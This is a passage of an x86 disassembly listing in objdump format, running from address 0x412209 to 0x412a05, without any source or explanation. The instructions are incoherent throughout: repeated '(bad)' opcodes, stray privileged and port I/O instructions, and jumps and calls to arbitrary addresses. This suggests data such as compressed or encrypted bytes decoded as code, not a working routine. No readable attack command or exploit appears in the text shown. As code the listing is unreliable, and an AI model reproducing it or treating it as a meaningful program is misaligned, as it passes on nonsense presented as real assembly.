  412209:	sbb    BYTE PTR [edx-0x59cff8b7],dh
  41220f:	ss mov bl,0x5
  412212:	fsubr  QWORD PTR [edi-0x6495d8ad]
  412218:	repz das 
  41221a:	enter  0xaa7d,0x4d
  41221e:	daa    
  41221f:	push   edi
  412220:	imul   ebp,DWORD PTR [ecx+0x74],0x579171c7
  412227:	adc    edx,DWORD PTR [edx-0x5b]
  41222a:	cmp    al,0x92
  41222c:	cmp    eax,0x8384a25d
  412231:	mov    bh,0xae
  412233:	sbb    DWORD PTR [ecx+0x2c],edx
  412236:	pop    ss
  412237:	add    BYTE PTR [esi-0x76],bh
  41223a:	(bad)  
  41223b:	mov    ebp,0x23f92253
  412240:	cmp    edx,eax
  412242:	pop    ecx
  412243:	mov    esi,0xd3c06990
  412248:	cmp    ch,0x16
  41224b:	loopne 0x4122ad
  41224d:	aas    
  41224e:	sbb    edi,ebp
  412250:	add    al,0x61
  412252:	es mov bh,0xfe
  412255:	cmovno edi,ebx
  412258:	jae    0x412282
  41225a:	mov    ebx,0xda118a19
  41225f:	pop    ecx
  412260:	xchg   ebx,eax
  412261:	sub    eax,0x86530cb2
  412266:	jo     0x41223b
  412268:	jge    0x4122d2
  41226a:	aaa    
  41226b:	sub    esp,esi
  41226d:	push   0x2e
  41226f:	lahf   
  412270:	rol    DWORD PTR ss:[edx],0x4b
  412274:	icebp  
  412275:	clc    
  412276:	arpl   WORD PTR [ecx-0x2c59aa38],si
  41227c:	sar    DWORD PTR [edi+0x69b0ae25],cl
  412282:	xor    al,0x38
  412284:	mov    bh,0x7b
  412286:	jno    0x4122b7
  412288:	inc    ecx
  412289:	jb     0x412304
  41228b:	in     al,0xda
  41228d:	inc    eax
  41228e:	add    DWORD PTR [esi+edi*4+0x5f],ebx
  412292:	sbb    dl,dl
  412294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412295:	in     al,0x97
  412297:	fdiv   QWORD PTR [esi-0x7]
  41229a:	cmc    
  41229b:	mov    bl,0xf6
  41229d:	mul    BYTE PTR [esi-0x9]
  4122a0:	add    BYTE PTR [eax+ebp*2+0x2b],cl
  4122a4:	call   0x87183c55
  4122a9:	pop    ebp
  4122aa:	cmp    DWORD PTR [edx],ebx
  4122ac:	add    ebx,ebp
  4122ae:	fdivr  DWORD PTR [esi+0x7e]
  4122b1:	xlat   BYTE PTR ds:[ebx]
  4122b2:	ror    WORD PTR [edi],1
  4122b5:	out    0xdb,eax
  4122b7:	ss cwde 
  4122b9:	sub    ebx,eax
  4122bb:	aam    0x11
  4122bd:	pop    ecx
  4122be:	rcr    bh,0x34
  4122c1:	push   DWORD PTR [esi+0x7b1e72ff]
  4122c7:	push   0xffffffbf
  4122c9:	stc    
  4122ca:	xor    al,0x58
  4122cc:	rol    DWORD PTR [edx+eax*4],cl
  4122cf:	or     eax,esi
  4122d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122d2:	bound  eax,QWORD PTR ds:0xc09a69aa
  4122d8:	jo     0x4122a6
  4122da:	sti    
  4122db:	jno    0x412293
  4122dd:	outs   dx,DWORD PTR ds:[esi]
  4122de:	gs into 
  4122e0:	inc    ecx
  4122e1:	bnd ja 0x41230c
  4122e4:	adc    cl,bl
  4122e6:	aad    0xf3
  4122e8:	mov    esp,0x72dbc4ec
  4122ed:	mul    DWORD PTR [esi+0x1]
  4122f0:	ss mov dl,0x53
  4122f3:	ret    
  4122f4:	or     ebx,DWORD PTR [edi-0x44020f9b]
  4122fa:	nop
  4122fb:	jecxz  0x412307
  4122fd:	fwait
  4122fe:	shr    ch,cl
  412300:	xchg   BYTE PTR [ecx-0x57],ch
  412303:	sahf   
  412304:	test   eax,0xcfc836fe
  412309:	clc    
  41230a:	sbb    al,bh
  41230c:	mov    DWORD PTR [ebx-0x7],edi
  41230f:	jl     0x4122a6
  412311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412312:	jg     0x4122f0
  412314:	inc    ecx
  412315:	jnp    0x412313
  412317:	dec    ecx
  412318:	jecxz  0x412351
  41231a:	xchg   ecx,eax
  41231b:	leave  
  41231c:	fstp   DWORD PTR [eax-0x5a7bea99]
  412322:	mov    dh,bl
  412324:	inc    eax
  412325:	and    al,0x46
  412327:	mov    DWORD PTR [ebp+0x69],ebp
  41232a:	test   DWORD PTR [ebx],esi
  41232c:	cmp    edx,DWORD PTR [esi-0x49]
  41232f:	pop    es
  412330:	sub    al,BYTE PTR [edi+0x65]
  412333:	shr    BYTE PTR [edi*8+0x52fd6a4e],cl
  41233a:	je     0x4123b4
  41233c:	pop    edx
  41233d:	pop    ds
  41233e:	fistp  WORD PTR [edi+0x5c]
  412341:	adc    DWORD PTR [esi-0x7c],eax
  412344:	fnsave [edi+edi*1+0x122660a9]
  41234b:	int3   
  41234c:	push   ebx
  41234d:	nop
  41234e:	out    0xb,eax
  412350:	push   esi
  412351:	cmp    dl,BYTE PTR [edi+0x18]
  412354:	sti    
  412355:	jns    0x412370
  412357:	and    DWORD PTR [ebp+0x5373d3c5],ebx
  41235d:	daa    
  41235e:	je     0x4123b1
  412360:	add    BYTE PTR [eax+0x6ad66a7b],bh
  412366:	mov    ds:0x7d5aaa32,al
  41236b:	fimul  WORD PTR [ecx+0x76]
  41236e:	jns    0x4123b7
  412370:	or     ebp,DWORD PTR [eax+0x2e]
  412373:	adc    eax,0x19df0096
  412378:	and    eax,DWORD PTR [eax]
  41237a:	mov    dl,BYTE PTR [ebp+0x30]
  41237d:	cmp    ch,bl
  41237f:	lock push ebx
  412381:	ret    0x43ba
  412384:	sub    ah,dh
  412386:	mov    bl,0x41
  412388:	and    edi,ebx
  41238a:	jno    0x4123d7
  41238c:	push   ebx
  41238d:	loop   0x4123d4
  41238f:	sub    ebp,ebp
  412391:	mov    al,0x1
  412393:	sti    
  412394:	push   ebp
  412395:	leave  
  412396:	mov    cl,0x8e
  412398:	fmul   DWORD PTR [edx-0x339b5251]
  41239e:	or     BYTE PTR [ecx],bl
  4123a0:	mov    eax,ds:0xaa8b89de
  4123a5:	fsubr  DWORD PTR [ecx+0x346150b0]
  4123ab:	sub    bh,BYTE PTR [eax-0x35]
  4123ae:	vmovntpd XMMWORD PTR ds:0xeabea8f8,xmm2
  4123b6:	inc    ecx
  4123b7:	pop    ebx
  4123b8:	shr    DWORD PTR [ebx+0x59],cl
  4123bb:	mov    edx,0x3f662390
  4123c0:	pop    edx
  4123c1:	add    eax,0x199533a5
  4123c6:	cmp    BYTE PTR [ecx],bl
  4123c8:	aaa    
  4123c9:	push   0xfbf1140a
  4123ce:	aam    0x10
  4123d0:	outs   dx,DWORD PTR ds:[esi]
  4123d1:	mov    al,0x3a
  4123d3:	stos   DWORD PTR es:[edi],eax
  4123d4:	push   ebx
  4123d5:	rcr    ecx,cl
  4123d7:	fs adc cl,0xfc
  4123db:	aam    0x75
  4123dd:	pop    eax
  4123de:	dec    esp
  4123df:	cmp    eax,0xebe919bf
  4123e4:	jae    0x41241d
  4123e6:	addr16 mov dl,0x26
  4123e9:	xchg   esi,eax
  4123ea:	pop    ebp
  4123eb:	cld    
  4123ec:	or     al,BYTE PTR [ebx]
  4123ee:	inc    ecx
  4123ef:	jle    0x4123e9
  4123f1:	dec    esi
  4123f2:	push   es
  4123f3:	jns    0x41241f
  4123f5:	ins    BYTE PTR es:[edi],dx
  4123f6:	sbb    eax,0x67bd2b29
  4123fb:	call   0x6d2735d0
  412400:	mul    BYTE PTR [ebx]
  412402:	popw   es
  412404:	pop    esi
  412405:	data16 and BYTE PTR ds:0x19cd6147,0xd3
  41240d:	push   ebx
  41240e:	sbb    bh,BYTE PTR [edi]
  412410:	mov    ch,0x90
  412412:	out    dx,al
  412413:	pop    ebp
  412414:	sub    DWORD PTR [bp-0x37],edx
  412418:	shr    ebx,cl
  41241a:	lea    edx,[edi+ebp*4-0x7f]
  41241e:	mov    edi,0xdf6ad70d
  412423:	or     BYTE PTR [esi+0xb16f7a2],dl
  412429:	call   DWORD PTR [eax]
  41242b:	dec    esi
  41242c:	in     eax,0x22
  41242e:	gs mov ecx,0x49e43c52
  412434:	(bad)  
  412435:	mov    al,0xf5
  412437:	sbb    eax,ebx
  412439:	pop    ds
  41243a:	ins    DWORD PTR es:[edi],dx
  41243b:	(bad)  
  41243c:	ror    ebp,cl
  41243e:	loopne 0x4123e5
  412440:	push   ebp
  412441:	and    eax,0xc6675195
  412446:	pop    DWORD PTR [ebp+0x3da4a013]
  41244c:	lds    ebp,FWORD PTR [edx-0x79]
  41244f:	mov    edi,0xe261b094
  412454:	adc    cl,dh
  412456:	mov    cs,edi
  412458:	push   ebx
  412459:	cld    
  41245a:	cmp    eax,0xc2c2f9f3
  41245f:	xchg   ebx,eax
  412460:	(bad)
  412464:	mov    WORD PTR [edx+edx*8],ds
  412467:	pop    es
  412468:	sub    al,0x82
  41246a:	mov    dx,0xae43
  41246e:	aaa    
  41246f:	mov    ebx,DWORD PTR [ebp-0x4921406b]
  412475:	sub    DWORD PTR [edi-0x56],esp
  412478:	xchg   BYTE PTR [ebx+0x4d],dl
  41247b:	gs sbb al,0xc6
  41247e:	mov    ebx,0xd4973b58
  412483:	and    al,0x52
  412485:	fist   WORD PTR [esi]
  412487:	jno    0x412436
  412489:	xchg   DWORD PTR [ebx-0x46],eax
  41248c:	sub    ecx,esp
  41248e:	or     ebx,DWORD PTR [ebx]
  412490:	clc    
  412491:	out    dx,al
  412492:	into   
  412493:	mov    eax,ds:0x810d29d
  412498:	push   edx
  412499:	jl     0x412501
  41249b:	rcl    DWORD PTR [bp+si-0xd],0xfb
  4124a0:	dec    ebx
  4124a1:	and    ebp,DWORD PTR [esi]
  4124a3:	(bad)  
  4124a4:	mov    ds:0x54a0b70d,al
  4124a9:	and    cl,bh
  4124ab:	add    eax,0x26641a0
  4124b0:	fsubr  DWORD PTR [ebx+edi*2+0x10a7cf95]
  4124b7:	sbb    esp,DWORD PTR [eax-0x2c]
  4124ba:	push   esi
  4124bb:	mov    cl,0x47
  4124bd:	in     eax,0xca
  4124bf:	ficom  DWORD PTR [ecx+0x41]
  4124c2:	in     al,0x2c
  4124c4:	mov    bh,0x53
  4124c6:	scas   al,BYTE PTR es:[edi]
  4124c7:	pop    ecx
  4124c8:	mov    ch,0x0
  4124ca:	mov    edx,0x4c1e4419
  4124cf:	sub    BYTE PTR [edi-0x5ca03c12],dl
  4124d5:	call   0x4e944f74
  4124da:	out    dx,eax
  4124db:	pusha  
  4124dc:	sbb    esp,DWORD PTR [eax+edi*2+0x1d]
  4124e0:	and    DWORD PTR [esi],eax
  4124e2:	sar    DWORD PTR [ebx-0x47550cae],0x1b
  4124e9:	xor    al,0x64
  4124eb:	push   ss
  4124ec:	pop    esp
  4124ed:	xchg   edx,eax
  4124ee:	jb     0x41255d
  4124f0:	push   ebx
  4124f1:	adc    BYTE PTR [ebx-0x13996f3e],ah
  4124f7:	sbb    edx,ebx
  4124f9:	ds mov ah,0xfa
  4124fc:	mov    ah,BYTE PTR [edx]
  4124fe:	cld    
  4124ff:	leave  
  412500:	push   eax
  412501:	jge    0x412522
  412503:	js     0x412524
  412505:	js     0x4124db
  412507:	je     0x4124c1
  412509:	mov    cl,0x79
  41250b:	jae    0x4124cf
  41250d:	idiv   BYTE PTR [ebx-0x180706e7]
  412513:	or     BYTE PTR [ebp-0x20],ah
  412516:	inc    edx
  412517:	fcom   DWORD PTR [ebx+0x33]
  41251a:	lods   al,BYTE PTR ds:[esi]
  41251b:	mov    edx,0x941370c4
  412520:	add    DWORD PTR [ecx-0x54],ecx
  412523:	test   DWORD PTR [edi-0x42],0xbe321b74
  41252a:	add    al,BYTE PTR [ebp-0x7a]
  41252d:	int    0x56
  41252f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412530:	cmp    al,0x16
  412532:	or     eax,0xb49f5059
  412537:	icebp  
  412538:	rcl    ah,1
  41253a:	loope  0x412575
  41253c:	into   
  41253d:	mov    al,0x88
  41253f:	inc    ecx
  412540:	cmp    al,0x2d
  412542:	jns    0x412519
  412544:	aam    0x1c
  412546:	cmp    eax,0x1486d32d
  41254b:	js     0x412513
  41254d:	hlt    
  41254e:	addr16 loope 0x412571
  412551:	sar    BYTE PTR [eax],cl
  412553:	clc    
  412554:	daa    
  412555:	adc    al,0xa5
  412557:	cmp    DWORD PTR [eax-0x44e4eb55],ebp
  41255d:	inc    ecx
  41255e:	jge    0x41252a
  412560:	lods   eax,DWORD PTR ds:[esi]
  412561:	sbb    ch,0xd5
  412564:	dec    esp
  412565:	int    0x10
  412567:	xor    ebp,DWORD PTR [esi+eiz*1-0x1d87ee7a]
  41256e:	jnp    0x4125a7
  412570:	or     DWORD PTR [ecx+0x30],esp
  412573:	or     DWORD PTR [esi+0x69],edi
  412576:	pop    eax
  412577:	mov    ebp,0xef3d3ca
  41257c:	rcl    BYTE PTR [ecx+0x66],0x7b
  412580:	jle    0x412522
  412582:	stos   DWORD PTR es:[edi],eax
  412583:	mov    ebp,0x19cd10ed
  412588:	fild   QWORD PTR [ecx]
  41258a:	fs sahf 
  41258c:	sbb    al,0x25
  41258e:	add    BYTE PTR [ecx-0x5b74c65d],ch
  412594:	dec    edi
  412595:	mov    DWORD PTR [eax-0x59d736c0],ebx
  41259b:	pop    ebx
  41259c:	aas    
  41259d:	sar    BYTE PTR [edi],0xd4
  4125a0:	push   ecx
  4125a1:	shr    DWORD PTR [ecx+ecx*4+0x16],cl
  4125a5:	xor    DWORD PTR [esi+0x6608d617],ecx
  4125ab:	mov    ah,BYTE PTR [edx]
  4125ad:	jbe    0x412555
  4125af:	sub    al,0x3a
  4125b1:	fdivp  st(0),st
  4125b3:	fcomip st,st(7)
  4125b5:	ret    
  4125b6:	dec    bp
  4125b8:	mov    dh,0xe2
  4125ba:	pop    ebp
  4125bb:	mov    ds:0x1a794999,eax
  4125c0:	int    0x6b
  4125c2:	cmp    dh,BYTE PTR [edi]
  4125c4:	ffreep st(5)
  4125c6:	in     al,dx
  4125c7:	sbb    DWORD PTR [eax+0x40],eax
  4125ca:	ret    0x5745
  4125cd:	lds    esi,FWORD PTR [ecx]
  4125cf:	jmp    0xf6708129
  4125d4:	cmp    eax,0x657f7b63
  4125da:	ret    
  4125db:	(bad)  
  4125dc:	sti    
  4125dd:	push   0xffffff83
  4125df:	mov    al,ds:0xba860f35
  4125e4:	jp     0x4125b6
  4125e6:	data16 jb 0x4125ea
  4125e9:	test   eax,0xc74ed15d
  4125ee:	jle    0x41260b
  4125f0:	das    
  4125f1:	adc    eax,ebp
  4125f3:	sub    dh,ah
  4125f5:	test   ebx,eax
  4125f7:	xchg   DWORD PTR [ebx-0x58],edx
  4125fa:	xchg   cl,al
  4125fc:	sub    edi,esp
  4125fe:	xchg   edi,eax
  4125ff:	shl    BYTE PTR [edx-0x7afce097],cl
  412605:	pop    edi
  412606:	(bad)  
  412607:	jg     0x41260a
  412609:	cmc    
  41260a:	fs mov cl,0x11
  41260d:	into   
  41260e:	mov    esi,0x1098bd9
  412613:	popf   
  412614:	aas    
  412615:	sbb    BYTE PTR ds:0x665df618,bl
  41261b:	fwait
  41261c:	and    ch,0x84
  41261f:	lahf   
  412620:	push   ebx
  412621:	xchg   BYTE PTR [ebp-0x57],bh
  412624:	sub    DWORD PTR [ecx+0x485f2b41],ebx
  41262a:	retf   0x9e4a
  41262d:	stos   BYTE PTR es:[edi],al
  41262e:	jp     0x4126a6
  412630:	data16 xlat BYTE PTR ds:[ebx]
  412632:	push   ecx
  412633:	call   0x65ba89da
  412638:	adc    ecx,ebx
  41263a:	cwde   
  41263b:	pop    ecx
  41263c:	mov    DWORD PTR [ebx+0x5c6b184c],eax
  412642:	bound  ebp,QWORD PTR [esp+edx*8-0x41]
  412646:	dec    ecx
  412647:	dec    edi
  412648:	push   ebx
  412649:	fs pop ecx
  41264b:	cmp    DWORD PTR [edi-0x69],edi
  41264e:	(bad)  
  41264f:	outs   dx,BYTE PTR cs:[esi]
  412651:	imul   edx,DWORD PTR [esp+eax*1+0x341ed7e0],0x1d665299
  41265c:	cmp    al,0x12
  41265e:	pop    edx
  41265f:	sbb    eax,0x19b0bc3f
  412664:	sar    DWORD PTR [edx+edi*2-0x6c],1
  412668:	pop    edx
  412669:	sbb    al,0x3b
  41266b:	push   es
  41266c:	sub    eax,0xccb0794e
  412671:	jae    0x41267a
  412673:	or     DWORD PTR [ebp-0x37e7bc0a],eax
  412679:	xchg   BYTE PTR [esi],dl
  41267b:	sbb    DWORD PTR [edi+0x1a],esp
  41267e:	or     BYTE PTR [edx+0x53],al
  412681:	adc    BYTE PTR [ecx],dl
  412683:	div    DWORD PTR [ebx-0x2782af44]
  412689:	push   es
  41268a:	shl    BYTE PTR [ecx+0x5],1
  41268d:	in     eax,dx
  41268e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41268f:	pop    ecx
  412690:	mov    WORD PTR [ebp-0x5],ss
  412693:	cmp    eax,0x5083a850
  412698:	ret    0xf5ff
  41269b:	dec    eax
  41269c:	push   edx
  41269d:	pop    esi
  41269e:	les    ebp,FWORD PTR [esi+0x27]
  4126a1:	or     al,0x58
  4126a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126a4:	enter  0x62c0,0x1b
  4126a8:	xor    al,BYTE PTR [eax]
  4126aa:	adc    eax,0x71ce269a
  4126af:	clc    
  4126b0:	mov    al,ds:0x8304f0d2
  4126b5:	pop    ecx
  4126b6:	or     al,0xa2
  4126b8:	shr    BYTE PTR [esi+0x10],cl
  4126bb:	sbb    esp,ebx
  4126bd:	push   ebp
  4126be:	sub    BYTE PTR [ecx],cl
  4126c0:	push   es
  4126c1:	push   edx
  4126c2:	jle    0x412657
  4126c4:	push   ebx
  4126c5:	nop
  4126c6:	jmp    0x412703
  4126c8:	sbb    esp,DWORD PTR [edi+0x38]
  4126cb:	mov    ds:0x6d4b6b01,al
  4126d0:	out    dx,eax
  4126d1:	add    bl,dh
  4126d3:	call   FWORD PTR [eax+0x53335b61]
  4126d9:	lahf   
  4126da:	daa    
  4126db:	sub    BYTE PTR [edx-0x2756064c],bh
  4126e1:	mov    edx,0x75ee1b06
  4126e6:	mov    edx,0x3796b691
  4126eb:	inc    ebx
  4126ec:	adc    edi,DWORD PTR [ebp-0x75]
  4126ef:	nop
  4126f0:	out    dx,eax
  4126f1:	test   DWORD PTR [esi+0x36],0xf50405cd
  4126f8:	and    ebx,DWORD PTR ds:0xa6fb4528
  4126fe:	outs   dx,DWORD PTR ds:[esi]
  4126ff:	jne    0x41274d
  412701:	leave  
  412702:	int3   
  412703:	jl     0x41276f
  412705:	mov    ebx,DWORD PTR [ecx]
  412707:	dec    esp
  412708:	js     0x4126cd
  41270a:	dec    ebx
  41270b:	sbb    BYTE PTR [ecx-0x74],ch
  41270e:	scas   eax,DWORD PTR es:[edi]
  41270f:	push   ebp
  412710:	daa    
  412711:	and    ecx,DWORD PTR [ecx]
  412713:	jo     0x412699
  412715:	pushw  0xffc1
  412718:	shr    ch,1
  41271a:	outs   dx,WORD PTR ds:[esi]
  41271c:	loop   0x4126a9
  41271e:	repnz mov BYTE PTR [esi-0x45],bl
  412722:	mov    ch,0x19
  412724:	jbe    0x412749
  412726:	jl     0x41276a
  412728:	call   0x53a5cf75
  41272d:	fdiv   QWORD PTR [esi]
  41272f:	rol    BYTE PTR [esi+eax*2+0x6a382e8e],1
  412736:	sub    esp,DWORD PTR [ebx+0x5d4c8b2c]
  41273c:	mov    esp,0xa5576426
  412741:	loope  0x4126d4
  412743:	mov    ebx,0xbf263699
  412748:	mov    ebx,0x83a565ef
  41274d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41274e:	repnz enter 0xfab8,0x1
  412753:	xchg   esp,eax
  412754:	into   
  412755:	sbb    DWORD PTR [eax-0x69],eax
  412758:	loopne 0x41271a
  41275a:	inc    esi
  41275b:	and    DWORD PTR [edi+0x532ec4d6],ebx
  412761:	std    
  412762:	nop
  412763:	adc    BYTE PTR [esi+ecx*2],bh
  412766:	mov    ebp,0x546b3777
  41276b:	mov    dh,BYTE PTR [esi-0xd]
  41276e:	cmp    al,0x4b
  412770:	add    bl,BYTE PTR [edi-0x30]
  412773:	mov    al,0x4f
  412775:	xor    BYTE PTR [ecx],0xaa
  412778:	shl    edx,cl
  41277a:	mov    cl,0xee
  41277c:	and    eax,DWORD PTR [ebp+0x695fdef8]
  412782:	xchg   DWORD PTR [eax+0x45],ecx
  412785:	push   ss
  412786:	loop   0x41270c
  412788:	add    ebp,edx
  41278a:	data16 shl BYTE PTR [edx-0x26],1
  41278e:	scas   eax,DWORD PTR es:[edi]
  41278f:	aaa    
  412790:	cs adc cl,dh
  412793:	sbb    DWORD PTR [ebx],ebp
  412795:	sar    DWORD PTR [ebx+0x636a55c2],0x3a
  41279c:	push   ebx
  41279d:	scas   eax,DWORD PTR es:[edi]
  41279e:	rol    BYTE PTR [eax+0x3d],1
  4127a1:	int3   
  4127a2:	inc    ebp
  4127a3:	enter  0x6aba,0x4
  4127a7:	call   0x280c1d02
  4127ac:	jl     0x412819
  4127ae:	(bad)
  4127b3:	fiadd  WORD PTR [eax]
  4127b5:	inc    edx
  4127b6:	dec    edx
  4127b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127b8:	imul   edi,DWORD PTR gs:[esi-0x6e3993eb],0x499cc643
  4127c3:	add    ecx,edi
  4127c5:	cmp    al,0x81
  4127c7:	cmp    ch,dl
  4127c9:	rcr    DWORD PTR [ebp-0x709e98a7],1
  4127cf:	pushf  
  4127d0:	inc    esp
  4127d1:	add    eax,0x9d7aa733
  4127d6:	enter  0xecf5,0xba
  4127da:	test   al,0xf2
  4127dc:	and    BYTE PTR [ecx+0x5ca45679],cl
  4127e2:	js     0x412799
  4127e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127e5:	std    
  4127e6:	cmp    bl,BYTE PTR [ecx]
  4127e8:	jg     0x412832
  4127ea:	mov    edi,0xe806fd57
  4127ef:	test   al,0x53
  4127f1:	adc    eax,0xca1a298e
  4127f6:	sar    BYTE PTR [edx],0xa9
  4127f9:	imul   edi,DWORD PTR [ebp-0x7a],0x551f1a9b
  412800:	mov    BYTE PTR [edx],dl
  412802:	aam    0x12
  412804:	xchg   ebp,esi
  412806:	dec    ebp
  412807:	cwde   
  412808:	clc    
  412809:	mov    ds:0xa06a2e90,al
  41280e:	ret    0xc19
  412811:	mov    bl,ch
  412813:	xchg   ebp,eax
  412814:	out    dx,al
  412815:	aas    
  412816:	cdq    
  412817:	push   es
  412818:	push   ebx
  412819:	xlat   BYTE PTR ds:[ebx]
  41281a:	push   ebp
  41281b:	(bad)  
  41281c:	mov    ds:0x5fde16e0,eax
  412821:	imul   edi,DWORD PTR [esp+ecx*2+0x4a],0xd58c82bc
  412829:	shl    DWORD PTR [esi+0x24],0x9a
  41282d:	iret   
  41282e:	ret    
  41282f:	cmp    al,bh
  412831:	mov    esi,0xed2919b3
  412836:	ins    BYTE PTR es:[edi],dx
  412837:	pop    edi
  412838:	fcomp  DWORD PTR [esi+0x78]
  41283b:	aad    0x53
  41283d:	mov    al,0xae
  41283f:	in     eax,0x94
  412841:	mov    eax,ds:0xef8fe189
  412846:	jg     0x412860
  412848:	xchg   edi,eax
  412849:	jl     0x412833
  41284b:	stc    
  41284c:	clc    
  41284d:	es stc 
  41284f:	adc    ch,bh
  412851:	cmp    DWORD PTR [esi+0x2c],esp
  412854:	inc    esp
  412855:	inc    ebx
  412856:	sahf   
  412857:	cmp    esi,esi
  412859:	add    esi,DWORD PTR [ecx+0x3e]
  41285c:	ins    BYTE PTR es:[edi],dx
  41285d:	add    BYTE PTR [ecx+0x4],bh
  412860:	add    DWORD PTR [ecx+0x5a530b4d],edi
  412866:	xor    BYTE PTR [esi+0x3fbf5649],0x91
  41286d:	imul   ebx,DWORD PTR [edx-0x43b3ccd6],0x67df20aa
  412877:	bound  esp,QWORD PTR [eax+0x4eefc175]
  41287d:	jns    0x4128d4
  41287f:	jp     0x4128e4
  412881:	imul   ebx,esi,0xfffffff1
  412884:	jl     0x412818
  412886:	cmp    eax,ebp
  412888:	mov    bl,0xbd
  41288a:	add    ebp,DWORD PTR ds:0xe2349953
  412890:	jmp    0xf64e:0xd0988966
  412897:	sti    
  412898:	mov    esi,0xbf49f9ae
  41289d:	push   esp
  41289e:	repz fadd st(2),st
  4128a1:	sub    BYTE PTR [ecx],bh
  4128a3:	scas   al,BYTE PTR es:[edi]
  4128a4:	push   0x60b0cae9
  4128a9:	cmp    al,0x9
  4128ab:	xchg   ebx,eax
  4128ac:	aam    0x6a
  4128ae:	xor    BYTE PTR ds:0xaa06884b,dl
  4128b4:	inc    esi
  4128b5:	pop    edi
  4128b6:	push   di
  4128b8:	ja     0x41283b
  4128ba:	fmulp  st(0),st
  4128bc:	js     0x4128af
  4128be:	pop    ds
  4128bf:	sbb    ebx,edi
  4128c1:	loopne 0x4128b1
  4128c3:	pop    es
  4128c4:	neg    BYTE PTR [eax]
  4128c6:	popf   
  4128c7:	mov    ds:0xf0d4a56d,al
  4128cc:	push   ebx
  4128cd:	push   cs
  4128ce:	arpl   WORD PTR [esi],cx
  4128d0:	std    
  4128d1:	aad    0x69
  4128d3:	(bad)  
  4128d4:	dec    ebx
  4128d5:	stos   DWORD PTR es:[edi],eax
  4128d6:	shr    BYTE PTR [esi-0x76aee02a],cl
  4128dc:	sub    ecx,edi
  4128de:	cs push cs
  4128e0:	pop    eax
  4128e1:	jmp    0x826c0156
  4128e6:	dec    eax
  4128e7:	xor    DWORD PTR [edi],esp
  4128e9:	add    eax,0xedb9aff2
  4128ee:	lods   eax,DWORD PTR ds:[esi]
  4128ef:	xlat   BYTE PTR ds:[ebx]
  4128f0:	stos   DWORD PTR es:[edi],eax
  4128f1:	mov    DWORD PTR [ecx-0x66],edi
  4128f4:	mov    bh,BYTE PTR [edx+ecx*8+0x3c3e6525]
  4128fb:	ins    DWORD PTR es:[edi],dx
  4128fc:	push   esi
  4128fd:	adc    DWORD PTR [esi+0x6a],esp
  412900:	aas    
  412901:	and    dh,bl
  412903:	shl    ebp,cl
  412905:	stc    
  412906:	cmp    cx,bx
  412909:	pop    eax
  41290a:	jns    0x4128f3
  41290c:	dec    ecx
  41290d:	mov    cl,0x54
  41290f:	sbb    bh,ch
  412911:	xchg   esp,eax
  412912:	sbb    edx,edx
  412914:	xor    cl,cl
  412916:	and    DWORD PTR [eax],eax
  412918:	push   ebx
  412919:	xchg   edx,eax
  41291a:	push   edi
  41291b:	mov    dl,0xd3
  41291d:	cmp    ebx,DWORD PTR [edx-0x6d]
  412920:	sub    al,0x6b
  412922:	jg     0x41292e
  412924:	or     al,0xd1
  412926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412927:	call   DWORD PTR [edx-0x4]
  41292a:	jno    0x4128f2
  41292c:	jb     0x412923
  41292e:	sbb    eax,0xc4a1a3c9
  412933:	fild   QWORD PTR [esi+ebp*8]
  412936:	test   eax,0xcc5ac719
  41293b:	test   edx,0x535dab7c
  412941:	cld    
  412942:	push   edi
  412943:	out    dx,eax
  412944:	inc    ebx
  412945:	pop    ecx
  412946:	repz aas 
  412948:	push   ss
  412949:	stos   DWORD PTR es:[edi],eax
  41294a:	mov    ebx,0x647d8241
  41294f:	add    eax,0x5a715352
  412954:	xchg   DWORD PTR [eax+0x72c31d51],ecx
  41295a:	jmp    0x412931
  41295c:	mov    ch,0x8a
  41295e:	pusha  
  41295f:	mov    al,0x4e
  412961:	test   al,0xb9
  412963:	out    0xce,al
  412965:	mov    ebp,0x74af1992
  41296a:	sbb    al,BYTE PTR ds:0xa639889b
  412970:	push   ebx
  412971:	pop    esi
  412972:	sbb    al,bh
  412974:	inc    esp
  412975:	xchg   ebx,eax
  412976:	fsubr  DWORD PTR [edx+ebp*1+0x6b]
  41297a:	shl    BYTE PTR [edi+eax*2-0xb066de3],1
  412981:	retf   0x8671
  412984:	loope  0x41295d
  412986:	pop    ecx
  412987:	mov    dl,0xf3
  412989:	imul   esp,DWORD PTR [edi+0x716b1fc1],0xc77fb4fe
  412993:	pop    ecx
  412994:	mov    ecx,0x175566d9
  412999:	rcr    edi,1
  41299b:	cmp    eax,0xd6eb360d
  4129a0:	pushw  ds
  4129a2:	gs aaa 
  4129a4:	cmp    bh,BYTE PTR [edi+0x6dfc086e]
  4129aa:	data16 mov ds:0xf37a5133,al
  4129b0:	fild   QWORD PTR [edi+0x13]
  4129b3:	sbb    ecx,eax
  4129b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129b6:	mov    bh,0xd4
  4129b8:	mov    ebx,0x531b3970
  4129bd:	out    0x8,al
  4129bf:	pop    esi
  4129c0:	jns    0x4129bb
  4129c2:	and    ecx,eax
  4129c4:	retf   
  4129c5:	sbb    BYTE PTR [ebp-0x682438f],al
  4129cb:	mov    al,ds:0x1cc75b52
  4129d0:	push   ebx
  4129d1:	data16 sub BYTE PTR [ecx+0x7d],0xf7
  4129d6:	cdq    
  4129d7:	mov    ebx,0x4a186959
  4129dc:	sbb    BYTE PTR [ebx+0x5eb28bc1],dl
  4129e2:	aam    0xf6
  4129e4:	dec    esp
  4129e5:	mov    BYTE PTR [edi],ch
  4129e7:	enter  0xebc,0xd6
  4129eb:	rol    BYTE PTR [edi],cl
  4129ed:	fcmovu st,st(1)
  4129ef:	sbb    DWORD PTR [edi+0x63bb409b],esi
  4129f5:	sub    eax,0x71508b02
  4129fa:	add    al,0x59
  4129fc:	sub    ah,BYTE PTR [eax+eax*8+0x4ccb01f9]
  412a03:	sbb    al,ah
  412a05:	or     BYTE PTR [edi-0x34d128c],ah
